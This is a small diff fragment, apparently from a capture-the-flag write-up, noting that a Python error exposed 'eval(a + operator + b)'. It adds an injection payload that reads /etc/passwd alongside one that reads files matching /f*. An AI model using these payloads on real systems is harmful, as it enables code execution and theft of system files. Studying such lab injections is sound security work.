@@ -15,6 +15,7 @@ python报错后显示了代码：eval(a + operator + b)
 ```
 
 ```
+eval(__import__('os').popen('cat /etc/passwd').read());
 eval(__import__('os').popen('cat /f*').read());
 ```
 
